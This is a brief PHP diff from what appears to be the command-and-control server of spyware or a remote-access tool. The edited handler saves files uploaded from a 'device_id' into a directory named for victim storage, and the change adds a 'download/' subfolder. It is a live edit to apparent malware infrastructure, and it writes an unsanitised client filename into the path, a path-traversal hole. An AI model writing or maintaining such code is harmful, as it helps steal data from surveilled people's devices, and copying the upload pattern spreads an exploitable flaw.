@@ -279,7 +279,7 @@ if (isset($_FILES["upload_file_nm"])) {
 
     $device_id = $_POST['device_id'];
 
-    if (move_uploaded_file($_FILES['upload_file_nm']['tmp_name'], $VICTIM_STORAGE_PATH . $_FILES["upload_file_nm"]['name'])) {
+    if (move_uploaded_file($_FILES['upload_file_nm']['tmp_name'], $VICTIM_STORAGE_PATH . "download/" . $_FILES["upload_file_nm"]['name'])) {
         $response_data['status'] = true;
     } else {
         $response_data['status'] = false;
